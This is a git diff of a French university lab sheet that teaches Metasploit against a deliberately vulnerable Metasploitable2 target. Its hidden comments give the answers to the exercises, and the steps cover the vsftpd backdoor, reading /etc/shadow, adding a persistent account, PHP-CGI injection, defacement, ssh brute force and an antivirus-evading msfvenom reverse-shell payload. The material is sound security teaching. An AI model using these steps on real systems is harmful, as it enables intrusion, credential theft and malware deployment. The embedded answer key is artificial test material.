@@ -1,4 +1,23 @@
-﻿# TP Metasploit
+﻿<!--
+
+TODO avant de lancer le TP :
+
+o Instancier une VM snap-docker-ready
+o docker pull tleemcjr/metasploitable2
+o docker run --name metasploitable2 -it tleemcjr/metasploitable2:latest sh -c "/bin/services.sh && bash"
+--
+o ouvrir les ports :
+	21,6200
+	80,4444
+	
+
+
+
+-->
+
+
+
+# TP Metasploit
 
 > Responsables : Jp Gelas, Thomas Begin
 
@@ -18,9 +37,17 @@ Ce TP est une introduction aux bases de l'utilisation de Metasploit. A savoir, c
 
 ### Démarrage de Metasploit
 
-Instancier une VM avec l'image `SecuNautibus` (small). Cette image contient le framework Metasploit pré installé. Notez que la distribution *Kali Linux* vient avec Metasploit pré installé.
+Instancier une VM avec l'image `Kali Linux 2020.3` (créez un nouveau volume de 30GB a supprimer lors de la destruction de la VM), 
+selectionner un *flavor* `m1.small` et votre clé SSH si vous en aviez plusieurs. 
+Cette image contient le framework Metasploit pré installé. Notez que la distribution *Kali Linux* vient avec Metasploit pré installé.
 
-Pour lancer le framework il suffit de saisir la commande `msfconsole` dans un terminal. L'invite devient `msf>`. La première commande que vous pouvez saisir est la commande `help` qui permet d'afficher le menu d'aide.
+Pour vous connecter à la VM vous saisirez la commande suivante : `ssh -i ~/maclé kali@adresseIPdeMaVM` (noté le login: **kali**).
+Pour devenir root le mot de passe est **toor** (exemple: `su -` ou `sudo su -` pour ne pas avoir à taper de mot de passe).
+
+Pour lancer le framework il suffit de saisir la commande `msfconsole` dans un terminal (Attention c'est lent la premiére fois). 
+L'invite devient `msf5>`. 
+La première commande que vous pouvez saisir est la commande `help` qui permet d'afficher le menu d'aide (et `banner` pour le fun).
+
 
 ```
 $ msfconsole
@@ -28,7 +55,8 @@ msf> help
 ...
 ```
 
-Vous pouvez ensuite saisir la commande `search` pour obtenir déterminer le ou les modules en lien avec le mot clé que vous passerez en paramètre. Par exemple la commande suivante listera tous les scripts et exploits en lien avec MySql.
+Vous pouvez ensuite saisir la commande `search` pour obtenir la liste du ou des modules en lien avec le mot clé que vous passerez en paramètre. 
+Par exemple la commande suivante listera tous les scripts et exploits en lien avec MySql.
 
 ```
 msf> search mysql
@@ -39,7 +67,7 @@ msf> search mysql
 La commande `info` affiche des informations supplémentaires.
 
 ```
-msf> info exploit/linux/http/librenms_collectd_cmd_inject``
+msf> info exploit/linux/http/librenms_collectd_cmd_inject
 ```
 
 Une fois que vous avez décidé quel module utiliser, saisissez la commande `use` pour le selectionner. Cela modifiera le contexte de vos commandes et vous permettra d'exécuter des commandes spécifiques à ce module.
@@ -60,6 +88,7 @@ msf exploit(linux/http/librenms_collectd_cmd_inject) > options
 msf exploit(linux/http/librenms_collectd_cmd_inject) > set RHOSTS 192.168.1.254
 ```
 Vous devrez définir toutes les variables requises avant de pouvoir exécuter l'exploit.
+Une fois vos *settings* terminé vous pouvez saisir à nouveau la commande `options` pour vérifier la bonne prise en compte de vos paramètres.
 
 Dans Metasploit, `LHOST`, `RHOST` et `SRVHOST` sont parmi les noms de variables les plus couramment utilisés. 
 
@@ -72,26 +101,34 @@ Enfin, une fois la configuration terminée, vous pouvez lancer la commande `expl
 ```
 msf exploit(linux/http/librenms_collectd_cmd_inject) > exploit
 ```
+--- 
+
+# A vous de jouer
 
 A présent à vous de jouer.
 
-Notez l'adresse IP de la machine cible. Vous initialiserez plus tard la variable `RHOST` avec cette adresse.
+Notez l'adresse IP de la machine cible (demandez la à vos enseignants). 
+Vous initialiserez plus tard la variable `RHOST` avec cette adresse.
  
 ```text
 _____ . _____ . _____ . _____ 
 ```
   
-  Lancez un scan sur la cible avec la commande `nmap`. Quelle(s) option(s) utilisez vous pour obtenir la liste des ports ouverts, le nom du service et sa version ?
+Lancez un scan sur la cible avec la commande `nmap`. 
+Quelle(s) option(s) utilisez vous pour obtenir la liste des ports ouverts, le nom du service et sa version ?
   <!-- nmap -sV @IPtarget -->
 
 ```text
 $ nmap ..........  _____ . _____ . _____ . _____
 ```
 
-
+---
 
 ### Exploit 1 : Exploitation d'une backdoor (vsftpd) 
 
+<!--
+https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/
+-->
   
   Relevez le nom et la version du service ftp (21/tcp).
   <!-- vsftpd 2.3.4 -->
@@ -102,49 +139,65 @@ $ nmap ..........  _____ . _____ . _____ . _____
 Lancez le framework Metasploit si ce n'est déjà fait.
     
 Combien d'exploits sont mis à votre disposition ?
-    <!-- >= 1639 -->
+
+<!-- plus de 2000 -->
+
 ```text
   
 ```
 
 Quelle commande de recherche allez vous saisir dans la console de Metasploit pour savoir si un (ou plusieurs) exploits sont disponibles pour exploiter ce service ftp en particulier.
-    <!-- search vsftpd -->
+
+<!-- search vsftpd -->
+
 ```text
   
 ```
 
 Quelle est le résultat ? (notez le chemin et nom du module, date, rang,...)
-    <!-- exploit/unix/ftp/vsftpd_234_backdoor 2011 excellent -->
+
+<!-- exploit/unix/ftp/vsftpd_234_backdoor 2011 excellent -->
+
 ```text
   
 ```
 
 Comment obtenir plus d'information sur cet exploit dans la console msf ?
-    <!-- info  exploit/unix/ftp/vsftpd_234_backdoor -->
+
+<!-- info  exploit/unix/ftp/vsftpd_234_backdoor -->
+
 ```text
   
 ```
 
 Notez dans la section _Basic options_ quelle(s) variable(s) devez vous configurer ?
-    <!--  RHOST -->
+
+<!--  RHOST -->
+
 ```text
   
 ```
 
 Selectionnez l'exploit avec la commande `use`.
-    <!-- use exploit/unix/ftp/vsftpd_234_backdoor -->
+
+<!-- use exploit/unix/ftp/vsftpd_234_backdoor -->
+
 ```text
   
 ```
 
 Quel est le nouvel invite de la ligne de commande ?
-    <!-- msf exploit(vsftpd_234_backdoor)>_ -->
+
+<!-- msf exploit(vsftpd_234_backdoor)>_ -->
+
 ```text
   
 ```
 
 Initialisez `RHOST` avec `set` puis lancez l'exploit.
-    <!-- set RHOST @IPtarget ; exploit -->
+
+<!-- set RHOST @IPtarget ; exploit -->
+
 ```text
   
 ```
@@ -156,28 +209,36 @@ la machine  cible (vsftpd). Remarquez que les ports utilisés sont différents d
 Bien que l'invite soit nul, vous pouvez saisir des commandes (ex: `ls`, `pwd`, ...)
 
 
-**Astuce** : Pour avoir un invite plus sympthique, cette commande *spawn* un pseudo-terminal `python -c 'import pty; pty.spawn("/bin/sh")'`. 
+**Astuce** : Pour avoir un invite plus sympthique, la commande suivante *spawn* un pseudo-terminal `python -c 'import pty; pty.spawn("/bin/sh")'`. 
 
 Quelles commandes saisir pour connaitre votre rôle (ou niveau de privilège) sur la cible ?
-    <!-- id ; whoami -->
+
+<!-- id ; whoami -->
+
 ```text
   
 ```
 
 Récupérez la version hashé des mots de passe. Vous pourrez l'utiliser plus tard avec un dictionnaire et un outil comme john (the ripper). 
-    <!--  cat /etc/shadow -->
+
+<!--  cat /etc/shadow -->
+
 ```text
   
 ```
 
 Profitez-en également pour vous assurez un retour facile sur cette machine compromise en vous créant un compte (pas très discret) 
-  <!-- adduser hacker OU useradd -m -d /home/hacker -c "" -s /bin/bash hacker 
+
+<!-- adduser hacker OU useradd -m -d /home/hacker -c "" -s /bin/bash hacker 
   -m = create home 
   -s = shell 
   -->
+
 ```text
 
 ```
+
+---
 
 ### Exploit 2 : Exploitation d'un service mal configuré (NFS)
 
@@ -213,16 +274,27 @@ ssh -i id_rsa root@_IP cible_
 
 ```
 
+---
 
 ### Exploit 3 : Service Web vulnerable (php + meterpreter)
 
 Essayez de déterminer quelle version de php est utilisé sur la machine cible.
-L'outil **???** permet de découvrir la présence d'un fichier `phpinfo.php`. Appelez le avec votre naviteur. Quelle version est utilisé ?
+L'outil `dirbuster` ou `dirb` permet de découvrir la présence d'un fichier `phpinfo.php`. 
+Appelez le avec votre navigateur. Quelle version est utilisé ?
 <!-- 5.2.4 -->
 ```text
     ___ . ___ . ___
 ```
-Cette version PHP est connu pour être vulnerable à *PHPCGI Argument Injection*.
+Cette version PHP est connue pour être vulnerable à *PHPCGI Argument Injection*.
+
+Quelles sont les arguments a passer à la commande `search` pour retrouver le nom exact de ce module sachant 
+qu'il date de 2012 (cve:2012) et qu'il est classé comme excellent (rank: excellent).
+
+<!-- search cve:2012 rank:excellent php cgi argument injection -->
+
+```text
+search ...
+```
 
 Utilisez le framework pour exploiter cette vulnerabilité.
 <!-- 
@@ -249,13 +321,15 @@ Notez que deux *payload* sont fondamentaux.
   - `...reverse_tcp` : la machine cible exécute le payload et se connecte à la machine attaquante.
 
 #### Defacing 
-Modifiez la page web d'acceuil (index.php).
+Modifiez la page web d'accueil (index.php) en y inscrivant un message de propagande amusant (Ex: Vive les pingoins !).
 <!-- sed -i -e 's/Warning/Hacked/g index.php -->
 
+---
 
 ### Exploit 4 : Injection (msfvenom)
 
-L'outil `msfvenom` est inclus dans le framework metasploit. Il est la fusion des anciens outils *msfpayload* et *msfencode*. `msfvenom` nous servira à la création sur mesure de payload avec possibilité d'encodage (voir même multi-encodage) pour échapper aux antivirus par exemple.
+L'outil `msfvenom` est inclus dans le framework metasploit. Il est la fusion des anciens outils *msfpayload* et *msfencode*. 
+`msfvenom` nous servira à la création sur mesure de payload avec possibilité d'encodage (voir même multi-encodage) pour échapper aux antivirus par exemple.
 
 L'outil se lance dans un terminal. Sa documentation est accessible avec l'option `-h`.
 
@@ -273,7 +347,7 @@ Créez et spécifiez un payload (`-p linux/x86/meterpreter/reverse_tcp`) et son 
 msfvenom -p ....................... -f ... LHOST=____.____.____.____ LPORT=.... > runmeplz
 ```
 
-A présent, dans la msfconsole nous allons lancer le module d'écoute en le paramétrant avec les même paramétres que ceux utiliser pour générer notre payload ci-avant.
+A présent, dans la msfconsole nous allons lancer le module d'écoute en le paramétrant avec les même paramétres que ceux utilisé pour générer notre payload ci-avant.
 
 ```text
 use exploit/multi/handler 
@@ -284,7 +358,8 @@ show info
 exploit -j -z
 ```
 
-Déployer et lancez le payload sur la machine cible (par le moyen de votre choix)
+Déployer et lancez le payload sur la machine cible (par le moyen de votre choix). 
+En vérité vous pousseriez la victime a lancer l'exécution de ce binaire sur son poste de travail.
 
 Une fois la console `meterpreter` démarrée vous pouvez commencer une nouvelle phase de post-exploitation.
 
@@ -298,7 +373,7 @@ meterpreter> sysinfo
 
 L'objectif de ce type d'encodeur est de modifier le code du payload sans pour autant en modifier son fonctionnement.
 
-Vous pouvez vérifier l'efficacité de votre encodage sur `virustotal.com` par exemple.
+Vous pouvez vérifier l'efficacité de votre encodage sur [virustotal.com](http://virustotal.com) par exemple.
 
 Sans encodage (payload brute), combien d'antivirus détecte que votre payload est un *Trojan* ?
 
@@ -310,6 +385,8 @@ msfvenom --list encoders
 
 Nous vous recommandons a minima l'encodeur *shikata ga nai*. Vérifié l'efficacité de votre encodage. Que constatez-vous ?
 
+---
+
 ### Exploit 5 : Scanner (smb_enumusers) et bruteforce
 
 ```text
@@ -319,7 +396,8 @@ run
 ```
 Vous devriez obtenir une liste de nom d'utilisateurs (msfadmin, klog, sys, user, service).
 
-En vous appuyant sur le dictionnaire *rockyou.txt* par exemple et un outil comme *hydra*, *patator* ou *ncrack* tentez de déterminer le mot de passe du compte *klog* sur le service ssh.
+En vous appuyant sur le dictionnaire *rockyou.txt* (disponible sur Kali dans /usr/share/wordlists/) par exemple et un outil comme *hydra*, *patator* ou *ncrack* 
+tentez de déterminer le mot de passe du compte *klog* sur le service ssh.
 
 <!-- 
 hydra -l klog -P ./rockyou.txt @_IP_cible ssh #(OK)
@@ -328,7 +406,10 @@ patator ssh_login user=klog password=FILE0 0=./rockyou.txt host=@IPcible \
  -x ignore:mesg='Authentication failed.' #(OK)
 
 ncrack -p22 --user klog -P ./rockyou.txt @IPcible #(KO)
+--
 -->
+
+---
 
 ### Exploit 6 : port 5900
 
@@ -353,4 +434,4 @@ Mot de passe : ___________
 
 
 
-- - -
+---
